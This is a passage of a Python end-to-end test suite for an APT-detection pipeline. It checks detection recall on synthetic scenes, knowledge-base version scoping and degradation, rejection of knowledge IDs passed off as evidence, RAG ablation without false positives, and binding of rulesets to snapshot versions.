    det_s3 = DetectionCoordinator(cfg).detect(ctx_s3, norm_s3.events)
    ev_to_pid_s3 = {e.event_id: e.physical_record_id for e in norm_s3.events}
    baseline_pids_s3 = {
        ev_to_pid_s3[eid]
        for h in (_field(det_s3, "hits", []) or [])
        for eid in (_field(h, "event_ids", []) or [])
        if eid in ev_to_pid_s3
    }
    pred_s3 = analyze_records(
        iter(s3_recs),
        config=cfg,
        valid_physical_ids=set(s3_idx),
        locator_map=_locator_map(s3_idx),
    )
    _helpers.assert_valid_prediction(pred_s3, set(s3_idx))
    expected_s3 = set(s3_meta["expected_pids"])
    baseline_recall_s3 = len(baseline_pids_s3 & expected_s3) / len(expected_s3)
    ma_recall_s3 = len(set(pred_s3["physical_id_set"]) & expected_s3) / len(expected_s3)
    assert ma_recall_s3 >= baseline_recall_s3
    assert expected_s3 <= set(pred_s3["physical_id_set"])


def test_p7_knowledge_version_scoping_and_rag_degradation(
    e2e_fixtures_dir: Path,
    make_app_config,
    load_scene_records,
) -> None:
    """P7: Version-scoped field dictionary lookup (v1 vs v2), empty miss, and corrupt/timeout degradation."""
    from apt_agent.pipeline import analyze_records

    cfg_ok = make_app_config(
        knowledge_path=e2e_fixtures_dir / "kb" / "synthetic_kb.jsonl",
        llm_enabled=False,
    )
    rag_ok = _make_rag_service(cfg_ok)

    res_v1 = rag_ok.search_knowledge(
        "creator_pid",
        role="converter_agent",
        filters={"product": "endpoint_sensor", "version": "v1"},
        top_k=5,
    )
    refs_v1 = _field(res_v1, "refs", []) or []
    assert any(_field(r, "chunk_id") == "kb-sensor-v1-creator-pid" for r in refs_v1)
    assert all(_field(r, "chunk_id") != "kb-sensor-v2-creator-pid" for r in refs_v1)

    res_v2 = rag_ok.search_knowledge(
        "creator_pid",
        role="converter_agent",
        filters={"product": "endpoint_sensor", "version": "v2"},
        top_k=5,
    )
    refs_v2 = _field(res_v2, "refs", []) or []
    assert any(_field(r, "chunk_id") == "kb-sensor-v2-creator-pid" for r in refs_v2)
    assert all(_field(r, "chunk_id") != "kb-sensor-v1-creator-pid" for r in refs_v2)

    res_miss = rag_ok.search_knowledge("no-such-term-xyz-98765", role="lead", top_k=5)
    assert (_field(res_miss, "refs", []) or []) == []

    # Corrupt KB + 100ms timeout -> graceful degradation without uncaught exception
    cfg_bad = make_app_config(
        knowledge_path=e2e_fixtures_dir / "kb" / "corrupt_kb.jsonl",
        rag_timeout_ms=100,
        llm_enabled=False,
    )
    rag_bad = _make_rag_service(cfg_bad)
    res_bad = rag_bad.search_knowledge("powershell", role="lead", top_k=5)
    assert isinstance(res_bad, dict)
    assert (_field(res_bad, "refs", []) or []) == []
    assert (
        _field(res_bad, "degraded") is True
        or _field(res_bad, "error") is not None
        or bool(_field(res_bad, "warnings"))
    )

    scene_dir = e2e_fixtures_dir / "scenarios" / "scene_01_phishing_c2"
    index, records = load_scene_records(scene_dir)
    pred = analyze_records(
        iter(records),
        config=cfg_bad,
        valid_physical_ids=set(index),
        locator_map=_locator_map(index),
    )
    _helpers.assert_valid_prediction(pred, set(index))
    assert {"pr-s01-0001", "pr-s01-0002", "pr-s01-0003"} <= set(pred["physical_id_set"])


def test_p8_knowledge_vs_evidence_isolation_verifier_reject(
    e2e_fixtures_dir: Path,
    make_app_config,
    make_run_context,
    load_scene_records,
) -> None:
    """P8: KnowledgeRef stays hypothesis-only; masquerading KB/doc/rag IDs as evidence triggers Verifier errors."""
    from apt_agent.blackboard import Blackboard, rank, verify
    from apt_agent.ingestion import Normalizer, ingest_records
    from apt_agent.models import Finding, KnowledgeRef, Submission
    from apt_agent.pipeline import to_prediction

    cfg = make_app_config(llm_enabled=False)
    rag = _make_rag_service(cfg)
    rag_res = rag.search_knowledge("certutil wks-99", role="lead")
    assert _field(rag_res, "evidence_ids", []) == []
    refs = _field(rag_res, "refs", []) or []
    hist_ref = next(r for r in refs if _field(r, "chunk_id") == "kb-hist-unrelated-certutil")
    kref = hist_ref if isinstance(hist_ref, KnowledgeRef) else KnowledgeRef(**hist_ref)

    scene_dir = e2e_fixtures_dir / "scenarios" / "scene_01_phishing_c2"
    index, records = load_scene_records(scene_dir)
    ctx = make_run_context(
        case_id="p8-isolation",
        run_id="run-p8",
        config=cfg,
        valid_physical_ids=set(index),
        locator_map=_locator_map(index),
    )
    store = ingest_records(iter(records), case_id=ctx.case_id, run_id=ctx.run_id)
    norm = Normalizer().normalize_batch(ctx, store)
    valid_eids = {e.event_id for e in norm.events}

    # 1. Hypothesis with knowledge_refs only -> pending/hypothesis, empty Prediction
    bb_hyp = Blackboard(ctx, valid_eids, valid_physical_ids=set(index))
    bb_hyp.submit_findings(
        ctx,
        Submission(
            case_id=ctx.case_id,
            run_id=ctx.run_id,
            task_id="task-hyp",
            submission_id="sub-hyp-only",
            query_ids=[],
            findings=[
                Finding(
                    claim="Unverified historical hypothesis",
                    status="hypothesis",
                    evidence_event_ids=[],
                    knowledge_refs=[kref],
                    tactic_ids=["TA0011"],
                )
            ],
            edges=[],
        ),
    )
    v_hyp = verify(ctx, bb_hyp)
    cr_hyp = rank(ctx, v_hyp.verified_state, store, [], [])
    assert to_prediction(ctx, cr_hyp, valid_physical_ids=set(index)) == {
        "physical_id_set": [],
        "ta_physical_ids": {},
    }

    # 2. Observed findings attempting to pass KB chunk_id, doc_id, or retrieval_id as evidence_event_ids
    fake_ids = ["kb-hist-unrelated-certutil", "doc-hist-wks99", "rag:req-1"]
    bb_bad = Blackboard(ctx, valid_eids, valid_physical_ids=set(index))
    receipt_bad = bb_bad.submit_findings(
        ctx,
        Submission(
            case_id=ctx.case_id,
            run_id=ctx.run_id,
            task_id="task-bad",
            submission_id="sub-bad-obs",
            query_ids=[],
            findings=[
                Finding(
                    claim="Knowledge ID masquerading as observed evidence",
                    status="observed",
                    evidence_event_ids=fake_ids,
                    knowledge_refs=[kref],
                    tactic_ids=["TA0011"],
                )
            ],
            edges=[],
        ),
    )
    rejected = _field(receipt_bad, "rejected_refs", []) or []
    assert len(rejected) >= len(fake_ids)
    accepted = set(_field(receipt_bad, "accepted_event_ids", []) or [])
    assert accepted.isdisjoint(set(fake_ids))

    # Even if a finding with fake IDs is placed onto state, verify() catches it as an error
    v_bad = verify(ctx, bb_bad)
    cr_bad = rank(ctx, v_bad.verified_state, store, [], [])
    assert to_prediction(ctx, cr_bad, valid_physical_ids=set(index)) == {
        "physical_id_set": [],
        "ta_physical_ids": {},
    }


def test_p9_independent_rag_ablation_budget_and_kb_exclusion(
    e2e_fixtures_dir: Path,
    tmp_path: Path,
    make_app_config,
    load_scene_records,
) -> None:
    """P9: KB excludes eval scenes/IDs; RAG ON vs OFF shares identical rules/engines/budget with 0 benign FPs."""
    from apt_agent.pipeline import analyze_records

    # 1. Verify synthetic_kb.jsonl & kb_v1.jsonl contain zero eval scene names or pr-s0* IDs
    for kb_name in ("synthetic_kb.jsonl", "kb_v1.jsonl"):
        kb_text = (e2e_fixtures_dir / "kb" / kb_name).read_text(encoding="utf-8")
        for i in range(1, 10):
            assert f"scene_0{i}" not in kb_text
            assert f"pr-s0{i}-" not in kb_text

    # 2. Compare RAG ON vs RAG OFF under fixed rules_dir, llm_enabled=False, engines, and budget
    empty_kb = tmp_path / "empty_kb.jsonl"
    empty_kb.write_text("", encoding="utf-8")
    shared_budget = {"max_rounds": 5, "max_tokens": 120000, "reserve_ratio": 0.8}

    cfg_rag_on = make_app_config(
        knowledge_path=e2e_fixtures_dir / "kb" / "synthetic_kb.jsonl",
        rag_top_k=5,
        llm_enabled=False,
        budget_overrides=shared_budget,
    )
    cfg_rag_off = make_app_config(
        knowledge_path=empty_kb,
        rag_top_k=1,
        llm_enabled=False,
        budget_overrides=shared_budget,
    )

    rag_on_svc = _make_rag_service(cfg_rag_on)
    on_res = rag_on_svc.search_knowledge("WINWORD powershell ProcessGuid", role="lead", top_k=5)
    assert _field(on_res, "evidence_ids", []) == []
    assert len(_field(on_res, "refs", []) or []) >= 1
    rag_off_svc = _make_rag_service(cfg_rag_off)
    off_res = rag_off_svc.search_knowledge("WINWORD powershell ProcessGuid", role="lead", top_k=1)
    assert _field(off_res, "evidence_ids", []) == []
    assert (_field(off_res, "refs", []) or []) == []

    # Scene 01 ablation
    s1_dir = e2e_fixtures_dir / "scenarios" / "scene_01_phishing_c2"
    s1_idx, s1_recs = load_scene_records(s1_dir)
    pred_s1_on = analyze_records(
        iter(s1_recs),
        config=cfg_rag_on,
        valid_physical_ids=set(s1_idx),
        locator_map=_locator_map(s1_idx),
    )
    pred_s1_off = analyze_records(
        iter(s1_recs),
        config=cfg_rag_off,
        valid_physical_ids=set(s1_idx),
        locator_map=_locator_map(s1_idx),
    )
    _helpers.assert_valid_prediction(pred_s1_on, set(s1_idx))
    _helpers.assert_valid_prediction(pred_s1_off, set(s1_idx))
    assert {"pr-s01-0001", "pr-s01-0002"} <= set(pred_s1_on["physical_id_set"])
    assert {"pr-s01-0001", "pr-s01-0002"} <= set(pred_s1_off["physical_id_set"])

    # Scene 09 benign ablation -> 0 FPs under both RAG ON and RAG OFF
    s9_dir = e2e_fixtures_dir / "scenarios" / "scene_09_benign"
    s9_idx, s9_recs = load_scene_records(s9_dir)
    pred_s9_on = analyze_records(
        iter(s9_recs),
        config=cfg_rag_on,
        valid_physical_ids=set(s9_idx),
        locator_map=_locator_map(s9_idx),
    )
    pred_s9_off = analyze_records(
        iter(s9_recs),
        config=cfg_rag_off,
        valid_physical_ids=set(s9_idx),
        locator_map=_locator_map(s9_idx),
    )
    assert pred_s9_on == {"physical_id_set": [], "ta_physical_ids": {}}
    assert pred_s9_off == {"physical_id_set": [], "ta_physical_ids": {}}

def test_investigation_binds_published_rules_to_the_requested_version(
    tmp_path: Path, e2e_fixtures_dir: Path, load_scene_records, make_app_config,
) -> None:
    from apt_agent.maintenance import SnapshotRegistry
    from apt_agent.pipeline import investigate_records

    scene = e2e_fixtures_dir / "scenarios" / "scene_01_phishing_c2"
    index, records = load_scene_records(scene)
    registry = SnapshotRegistry(tmp_path / "snapshots")
    rules = e2e_fixtures_dir / "rules" / "valid"
    for version, name in (
        ("v1", "benign_no_match.yml"), ("v2", "win_winword_powershell.yml")
    ):
        registry.publish_snapshot("ruleset", version, {name: (rules / name).read_text()})

    low_alert_rule = (rules / "win_winword_powershell.yml").read_text().replace(
        "level: high", "level: informational"
    )
    registry.publish_snapshot("ruleset", "context-only", {"rule.yml": low_alert_rule})

    config = make_app_config(
        snapshots_dir=registry.root,
        enabled_engines={"rsigma"},
        overrides={"engines": {"rsigma": {"rules_dir": None}}},
    )
    kwargs = {"valid_physical_ids": set(index), "locator_map": _locator_map(index)}
    first = investigate_records(iter(records), config=config, **kwargs)
    updated = config.model_copy(deep=True)
    updated.snapshots.ruleset_version = "v2"
    second = investigate_records(iter(records), config=updated, **kwargs)
    replay = investigate_records(iter(records), config=config, **kwargs)

    assert first.attack_event_ids == replay.attack_event_ids == []
    assert first.snapshot_refs["ruleset_version"] == replay.snapshot_refs["ruleset_version"] == "v1"
    assert second.snapshot_refs["ruleset_version"] == "v2"
    assert {
        second.event_to_physical[event_id] for event_id in second.attack_event_ids
    } >= {"pr-s01-0001", "pr-s01-0002", "pr-s01-0003"}
    assert second.investigation_ledger
    updated.snapshots.ruleset_version = "context-only"
    context_only = investigate_records(iter(records), config=updated, **kwargs)
    assert context_only.attack_event_ids == []
    assert any(run.hit_count for run in context_only.coverage if run.engine == "rsigma")

def test_unavailable_rule_logsource_cannot_create_attack_evidence(
    tmp_path: Path, e2e_fixtures_dir: Path, load_scene_records, make_app_config,
) -> None:
    from apt_agent.pipeline import investigate_records

    rules = tmp_path / "rules"
    rules.mkdir()
    (rules / "wrong_source.yml").write_text(
        "title: Scoped high-level detection\n"
        "id: 11111111-1111-4111-8111-111111111111\n"
        "logsource: {product: zeek, service: rdp}\n"
        "detection:\n"
        "  selection: {Image: 'missing.exe'}\n"
        "  condition: not selection\n"
        "level: high\n",
        encoding="utf-8",
    )
    scene = e2e_fixtures_dir / "scenarios" / "scene_01_phishing_c2"
    index, records = load_scene_records(scene)
    config = make_app_config(rules_dir=rules, enabled_engines={"rsigma", "zircolite"})

    case = investigate_records(iter(records), config=config, locator_map=_locator_map(index))

    assert case.attack_event_ids == []
    assert any(
        run.reason == "detector_matches_outside_rule_logsource"
        for run in case.coverage
    )
